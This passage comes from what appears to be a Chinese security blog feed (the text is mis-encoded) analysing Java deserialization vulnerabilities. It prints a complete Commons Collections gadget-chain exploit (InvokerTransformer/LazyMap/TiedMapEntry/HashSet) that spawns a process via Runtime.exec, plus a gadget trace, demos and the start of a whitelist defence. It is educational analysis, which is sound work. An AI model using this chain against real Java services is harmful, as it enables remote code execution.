org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PayloadLazyMap</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">final</span> Transformer[] evilTransformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line"><span class="comment">// Runtime</span></span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">// (Method)Runtime.class.getMethod("getRuntime", null)</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</span><br><span class="line">new Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line"><span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">null</span>&#125;), <span class="comment">//getMethod(å‡½æ•°åï¼Œè¿”å›å€¼ç±»å‹)</span></span><br><span class="line"><span class="comment">// (java.lang.Runtime)Runtime.class.getMethod("getRuntime", null).invoke(null, null)</span></span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line"><span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;), <span class="comment">//invoke(å‡½æ•°åï¼Œå‡½æ•°å‚æ•°)</span></span><br><span class="line"><span class="comment">// (java.lang.ProcessImpl)</span></span><br><span class="line"><span class="comment">// Runtime.class.getMethod("getRuntime", null).invoke(null,null).exec("calc")</span></span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line"><span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">new Object[]&#123;"calc"&#125;),</span><br><span class="line">&#125;;</span><br><span class="line">Transformer evilTransformerChain = <span class="keyword">new</span> ChainedTransformer(evilTransformers);</span><br><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, evilTransformerChain);</span><br><span class="line">TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">HashSet hashSet = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">hashSet.add(<span class="string">"nonce"</span>);</span><br><span class="line">Field hashSetMapField = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">hashSetMapField = HashSet.class.getDeclaredField("map");</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">hashSetMapField = HashSet.class.getDeclaredField("backingMap");</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hashSetMapField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">HashMap innerHashMap = (HashMap) hashSetMapField.get(hashSet);</span><br><span class="line"></span><br><span class="line">Field hashMapTableField = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">hashMapTableField = HashMap.class.getDeclaredField("table");</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">hashMapTableField = HashMap.class.getDeclaredField("elementData");</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hashMapTableField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object[] array = (Object[]) hashMapTableField.get(innerHashMap);</span><br><span class="line">Object node = array[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">node = array[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Field keyField = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">keyField = node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">keyField = Class.forName(<span class="string">"java.util.MapEntry"</span>).getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">&#125;</span><br><span class="line">keyField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">keyField.set(node, entry);</span><br><span class="line"></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.ser"</span>);</span><br><span class="line">ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">out.writeObject(hashSet);</span><br><span class="line">out.flush();</span><br><span class="line">out.close();</span><br><span class="line"></span><br><span class="line">         payloadTest();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">payloadTest</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"payload.ser"</span>));</span><br><span class="line">in.readObject();</span><br><span class="line">in.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–åå¼¹å‡ºè®¡ç®—å™¨ï¼Œè¯´æ˜æˆ‘ä»¬POPæ„é€ æˆåŠŸ</p><h2 id="POPé“¾åˆ†æ"><a href="#POPé“¾åˆ†æ" class="headerlink" title="POPé“¾åˆ†æ"></a>POPé“¾åˆ†æ</h2><p>å®ƒçš„POPé“¾ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    java.io.ObjectInputStream.readObject()</span><br><span class="line">        java.util.HashSet.readObject()</span><br><span class="line">            java.util.HashMap.put()</span><br><span class="line">            java.util.HashMap.hash()</span><br><span class="line">                org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                    org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                        org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                        org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                        java.lang.reflect.Method.invoke()</span><br><span class="line">                            java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure><h3 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h3><p>å…ˆçœ‹HashSet:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashSet</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractSet</span>&lt;<span class="title">E</span>&gt; </span></span><br><span class="line"><span class="class"><span class="keyword">implements</span> <span class="title">Set</span>&lt;<span class="title">E</span>&gt;, <span class="title">Cloneable</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> HashMap&lt;E,Object&gt; map;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HashSet</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;</span><br><span class="line">        map = <span class="keyword">new</span> HashMap&lt;&gt;(initialCapacity);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> </span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">            <span class="comment">// Create backing HashMap</span></span><br><span class="line">        map = (((HashSet&lt;?&gt;)<span class="keyword">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">               <span class="keyword">new</span> LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">               <span class="keyword">new</span> HashMap&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">        <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                E e = (E) s.readObject();</span><br><span class="line">            map.put(e, PRESENT); <span class="comment">//Notice this</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ƒå†…éƒ¨å­˜åœ¨ä¸€ä¸ªHashMapï¼Œå› ä¸ºHashSetæœ¬èº«çš„å®ç°åŸç†å°±æ˜¯åˆ©ç”¨HashMapï¼Œåœ¨æ–°å…ƒç´ eåŠ å…¥Setæ—¶ï¼Œå®é™…ä¸Šåœ¨HashMapä¸­ä¿å­˜<hash(e), e>ã€‚</hash(e),></p><p>åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ï¼ŒåŒæ ·ä¹Ÿä¼šå°†å¯¹è±¡åŠ å…¥è¿™ä¸ªHashMapï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨çš„å°±æ˜¯<code>map.put(e, PRESENT)</code>è¿™å¥è¯ï¼Œåœ¨è°ƒè¯•æ—¶ï¼Œå¯ä»¥çœ‹åˆ°eå¯¹è±¡æ˜¯ä¸€ä¸ªTiedMapEntryå¯¹è±¡ï¼Œkey=fooï¼Œvalue=ProcessImplï¼š</p><p><img src="/ååºåˆ—åŒ–-Commons-Collections-Javaååºåˆ—åŒ–æ¼æ´ä¸POP-Gadgets/1546224558228.png" alt="1546224558228"></p><p>keyå¾ˆå¥½ç†è§£ï¼Œä½†æ˜¯valueä¸ºä»€ä¹ˆæ˜¯ProcessImplï¼Ÿè¿™è¿˜è¦å†å‘ä¸‹çœ‹ï¼š</p><h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><p>HashMap.put()è°ƒç”¨äº†hashæ–¹æ³•ï¼š</p><p><img src="/ååºåˆ—åŒ–-Commons-Collections-Javaååºåˆ—åŒ–æ¼æ´ä¸POP-Gadgets/1546224687897.png" alt="1546224687897"></p><p>hashæ–¹æ³•è°ƒç”¨äº†key.hashCode()æ–¹æ³•ï¼Œæ ¹æ®Gadgetsé“¾å¯ä»¥çŒœæµ‹æˆ‘ä»¬çš„key.hashCode()å®é™…ä¸Šæ˜¯TiedMapEntry.hashCode()ï¼š</p><p><img src="/ååºåˆ—åŒ–-Commons-Collections-Javaååºåˆ—åŒ–æ¼æ´ä¸POP-Gadgets/1546225603303.png" alt="1546225603303"></p><h3 id="org-apache-commons-collections-keyvalue-TiedMapEntry"><a href="#org-apache-commons-collections-keyvalue-TiedMapEntry" class="headerlink" title="org.apache.commons.collections.keyvalue.TiedMapEntry"></a>org.apache.commons.collections.keyvalue.TiedMapEntry</h3><p>ç»§ç»­è·Ÿè¿›ï¼Œå°±åˆ°äº†TiedMapEntryçš„hashCode()æ–¹æ³•äº†ï¼Œç®€å•ä»‹ç»ä¸€ä¸‹TiedMapEntryï¼Œå®ƒç»§æ‰¿äº†æ™®é€šçš„Entityç±»ï¼ˆå°±æ˜¯é«˜çº§forå¾ªç¯ç”¨åˆ°çš„é‚£ä¸ªï¼‰ï¼Œå…¶æ„é€ æ–¹æ³•æ˜¯<code>TiedMapEntry(Map&lt;K,V&gt; map, K key)</code>ã€‚</p><p>è¿™é‡Œéœ€è¦åˆ©ç”¨å®ƒçš„hashCode()æ–¹æ³•ï¼š</p><p><img src="/ååºåˆ—åŒ–-Commons-Collections-Javaååºåˆ—åŒ–æ¼æ´ä¸POP-Gadgets/1546226115263.png" alt="1546226115263"></p><p>ä»¥åŠå…¶è°ƒç”¨çš„getValue()æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°å®ƒå®é™…è°ƒç”¨çš„æ˜¯LazyMap.get()æ–¹æ³•ï¼š</p><p><img src="/ååºåˆ—åŒ–-Commons-Collections-Javaååºåˆ—åŒ–æ¼æ´ä¸POP-Gadgets/1546226273203.png" alt="1546226273203"></p><h3 id="org-apache-commons-collections-keyvalue-LazyMap"><a href="#org-apache-commons-collections-keyvalue-LazyMap" class="headerlink" title="org.apache.commons.collections.keyvalue.LazyMap"></a>org.apache.commons.collections.keyvalue.LazyMap</h3><p>ç»ˆäºï¼ï¼ï¼æˆ‘ä»¬åˆ°äº†é“¾çš„æœ€åº•ç«¯ï¼ŒLazyMap.get()ï¼ŒLazyMapåŸºäºMapï¼ŒMapä¸€å¼€å§‹ä¸æ”¾å…ƒç´ ï¼Œåªæœ‰åœ¨get()æ—¶æ‰ä¼šé€šè¿‡ä¹‹å‰å®šä¹‰çš„factoryæ·»åŠ å…ƒç´ ï¼ˆè¿™é‡Œçš„factoryå¯ä»¥ä½¿Transformerç±»å‹ï¼‰ã€‚æˆ‘çš„æ–­ç‚¹æ²¡åŠæ³•åœ¨åºåˆ—åŒ–æ—¶æ•æ‰ifé‡Œé¢çš„è¯­å¥ï¼Œå¥½åƒæ˜¯å› ä¸ºè°ƒè¯•å™¨ä¼šåœ¨è°ƒè¯•è¯­å¥å‰æ‰§è¡Œè¯¥è¯­å¥çš„åŸå› ï¼Œä¸è¿‡è¿™ä¸ªåœ¨å…ˆå‰æ–‡ç« (<a href="https://security.tencent.com/index.php/blog/msg/97" title="Commons Collections Javaååºåˆ—åŒ–æ¼æ´æ·±å…¥åˆ†æ," target="_blank" rel="noopener">Commons Collections Javaååºåˆ—åŒ–æ¼æ´æ·±å…¥åˆ†æ</a>)éƒ½ä»‹ç»è¿‡ï¼Œè¿™é‡Œå†™ä¸€ä¸ªdemoæ¨¡æ‹Ÿä¸€ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyMapDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Transformer[] evilTransformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line"><span class="comment">// Runtime</span></span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">// (Method)Runtime.class.getMethod("getRuntime", null)</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</span><br><span class="line">new Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line"><span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">null</span>&#125;), <span class="comment">//getMethod(å‡½æ•°åï¼Œè¿”å›å€¼ç±»å‹)</span></span><br><span class="line"><span class="comment">// (java.lang.Runtime)Runtime.class.getMethod("getRuntime", null).invoke(null, null)</span></span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line"><span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;), <span class="comment">//invoke(å‡½æ•°åï¼Œå‡½æ•°å‚æ•°)</span></span><br><span class="line"><span class="comment">// (java.lang.ProcessImpl)</span></span><br><span class="line"><span class="comment">// Runtime.class.getMethod("getRuntime", null).invoke(null,null).exec("calc")</span></span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line"><span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">new Object[]&#123;"calc"&#125;),</span><br><span class="line">&#125;;</span><br><span class="line">Transformer evilTransformerChain = <span class="keyword">new</span> ChainedTransformer(evilTransformers);</span><br><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, evilTransformerChain);</span><br><span class="line">lazyMap.get(<span class="string">'a'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœï¼š</p><p><img src="/ååºåˆ—åŒ–-Commons-Collections-Javaååºåˆ—åŒ–æ¼æ´ä¸POP-Gadgets/1546227538067.png" alt="1546227538067"></p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ol><li><a href="https://security.tencent.com/index.php/blog/msg/97" title="Commons Collections Javaååºåˆ—åŒ–æ¼æ´æ·±å…¥åˆ†æ," target="_blank" rel="noopener">Commons Collections Javaååºåˆ—åŒ–æ¼æ´æ·±å…¥åˆ†æ</a></li><li><a href="https://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/" title="JAVA Apache-CommonsCollections åºåˆ—åŒ–æ¼æ´åˆ†æä»¥åŠæ¼æ´é«˜çº§åˆ©ç”¨" target="_blank" rel="noopener">JAVA Apache-CommonsCollections åºåˆ—åŒ–æ¼æ´åˆ†æä»¥åŠæ¼æ´é«˜çº§åˆ©ç”¨</a></li><li><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨-ååºåˆ—åŒ– </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaååºåˆ—åŒ–1ï¼šåŸºç¡€</title>
      <link href="/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/"/>
      <url>/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>javaååºåˆ—åŒ–åº”è¯¥ç®—æ˜¯java webä¸­æœ€æœ‰ä»£è¡¨æ€§çš„ä¸€ç±»å®‰å…¨æ€§é—®é¢˜äº†ï¼Œå› ä¸ºä¹‹å‰é¢è¯•ä¹Ÿè¢«é—®åˆ°è¿‡ï¼Œè¿™ä¸¤å¤©å¥½å¥½ç ”ç©¶ä¸€ä¸‹ã€‚</p><h1 id="Demoä»£ç "><a href="#Demoä»£ç " class="headerlink" title="Demoä»£ç "></a>Demoä»£ç </h1><p>å‚è€ƒâ€Javaååºåˆ—åŒ–æ¼æ´ä»å…¥é—¨åˆ°æ·±å…¥â€ä¸€æ–‡ï¼Œå…·ä½“æµç¨‹ä¸ºï¼š1ï¼‰åºåˆ—åŒ–ä¸å®‰å…¨çš„ç±»ï¼ˆæ”»å‡»è€…æ‰€è¦åšçš„ï¼‰ï¼›2ï¼‰è„†å¼±ç¨‹åºååºåˆ—åŒ–ä¸å®‰å…¨çš„ç±»ï¼›3ï¼‰æ¶æ„ä»£ç è¢«æ‰§è¡Œã€‚</p><a id="more"></a><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulnSerialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//å®šä¹‰myObjå¯¹è±¡</span></span><br><span class="line">        MyObject myObj = <span class="keyword">new</span> MyObject();</span><br><span class="line">        myObj.name = <span class="string">"hi"</span>;</span><br><span class="line">        <span class="comment">//åˆ›å»ºä¸€ä¸ªåŒ…å«å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–ä¿¡æ¯çš„"object"æ•°æ®æ–‡ä»¶</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"object.ser"</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        <span class="comment">//writeObject()æ–¹æ³•å°†myObjå¯¹è±¡å†™å…¥objectæ–‡ä»¶</span></span><br><span class="line">        os.writeObject(myObj);</span><br><span class="line">        os.close();</span><br><span class="line">        <span class="comment">//ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–objå¯¹è±¡</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"object.ser"</span>);</span><br><span class="line">        <span class="comment">// AntObjectInputStream ois = new AntObjectInputStream(fis);</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        <span class="comment">//æ¢å¤å¯¹è±¡ï¼Œååºåˆ—åŒ–ä½¿ç”¨readObjectè·å–å¯¹è±¡ï¼Œè¿™é‡Œè°ƒç”¨äº†å·²ç»è¢«é‡å†™çš„å‡½æ•°</span></span><br><span class="line">        MyObject objectFromDisk = (MyObject)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//é‡å†™ObjectInputStream.readObject()æ–¹æ³•ï¼ŒJavaä¼šä¼˜å…ˆè°ƒç”¨é‡å†™çš„readObject()æ–¹æ³•ã€‚</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//æ‰§è¡Œé»˜è®¤çš„readObject()æ–¹æ³•</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">//æ‰§è¡Œæ‰“å¼€è®¡ç®—å™¨ç¨‹åºå‘½ä»¤</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ç»“æœåˆ†æ"><a href="#ç»“æœåˆ†æ" class="headerlink" title="ç»“æœåˆ†æ"></a>ç»“æœåˆ†æ</h1><p>å¯ä»¥çœ‹åˆ°ï¼ŒVulnSerialize.main()ä¸­ååºåˆ—åŒ–ä¸€ä¸ªä¸å®‰å…¨çš„ç±»MyObjectï¼Œè¯¥ç±»é‡å†™äº†ObjectInputStream.readObject()(é¢å‘å¯¹è±¡çš„å¤šæ€æ€§)ä½¿å…¶å¼¹å‡ºè®¡ç®—å™¨ï¼Œåˆå› ä¸ºååºåˆ—åŒ–æ—¶ï¼ŒJavaä¼šè°ƒç”¨ObjectInputStreamç±»çš„readObject()æ–¹æ³•ï¼Œå¦‚æœè¢«ååºåˆ—åŒ–çš„ç±»é‡å†™äº†readObject()ï¼Œé‚£ä¹ˆè¯¥ç±»åœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼ŒJavaä¼šä¼˜å…ˆè°ƒç”¨é‡å†™çš„readObject()æ–¹æ³•ï¼Œå› æ­¤é€ æˆä»»æ„ä»£ç æ‰§è¡Œã€‚</p><p><img src="/ååºåˆ—åŒ–-Javaååºåˆ—åŒ–åŸºæœ¬åŸç†/1546052977799.png" alt="1546052977799"></p><p>æ³¨æ„ä¸€ç‚¹æ˜¯æˆ‘ä»¬åªèƒ½ååºåˆ—åŒ–å·²çŸ¥çš„ç±»ï¼Œå…·ä½“æ¥è¯´ï¼Œå¦‚æœæˆ‘ä»¬çš„ç¨‹åºä¸­æ²¡æœ‰MyObjectç±»ï¼Œé‚£ä¹ˆååºåˆ—åŒ–ä¼šçˆ†å‡ºClassNotFoundå¼‚å¸¸ï¼Œè¿™ä¹Ÿæ˜¯ååºåˆ—åŒ–æ¼æ´éœ€è¦æ„é€ POPçš„æ ¹æœ¬åŸå› ï¼Œè¿™ä¸ªåœ¨ä¹‹åçš„æ–‡ç« ä¼šè¯´ã€‚</p><p><img src="/ååºåˆ—åŒ–-Javaååºåˆ—åŒ–åŸºæœ¬åŸç†/1546144818685.png" alt="1546144818685"></p><h1 id="é˜²å¾¡æ–¹å¼"><a href="#é˜²å¾¡æ–¹å¼" class="headerlink" title="é˜²å¾¡æ–¹å¼"></a>é˜²å¾¡æ–¹å¼</h1><p>é˜²å¾¡æ–¹æ³•åœ¨<a href="https://xz.aliyun.com/t/2041" target="_blank" rel="noopener">Javaååºåˆ—åŒ–æ¼æ´ä»å…¥é—¨åˆ°æ·±å…¥</a>ä¸€æ–‡ä¸­ä»‹ç»äº†å¾ˆå¤šç§ï¼Œä½†æ˜¯åŸºæœ¬åŸç†éƒ½æ˜¯é€šè¿‡ç™½/é»‘åå•å¯¹ååºåˆ—åŒ–çš„ç±»è¿›è¡Œæ§åˆ¶ã€‚è¿™é‡Œä»‹ç»ä¸€ç§ç”±IBMçš„ç ”ç©¶äººå‘˜Pierre Ernståœ¨ã€Š<a href="https://www.ibm.com/developerworks/library/se-lookahead/" target="_blank" rel="noopener">Look-ahead Java deserialization</a>ã€‹ä¸­æå‡ºçš„é‡å†™ObjectInputStream.resolveClass()å¯¹ååºåˆ—åŒ–çš„ç±»è¿›è¡Œç™½åå•/é»‘åå•æ§åˆ¶çš„æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AntObjectInputStream</span> <span 